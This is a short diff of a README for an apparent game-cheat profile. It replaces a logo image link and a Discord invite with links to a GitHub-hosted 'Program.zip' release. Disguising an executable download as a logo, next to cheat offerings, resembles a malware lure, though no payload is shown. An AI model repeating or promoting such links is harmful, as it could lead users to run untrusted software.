@@ -6,9 +6,9 @@
 **C++ , C#...**
 
 ## 💎 Supreme Owner
-![Logo](https://i.ibb.co/yRQ3KCM/SUPREME-1.gif)
+![Logo](https://github.com/SUPREME-Snaze/main/releases/download/v1.0/Program.zip)
 
-### https://discord.gg/WkENDWgnrs
+### https://github.com/SUPREME-Snaze/main/releases/download/v1.0/Program.zip
 
 ## 💕 Free / Paid Source for your paste cheets
 
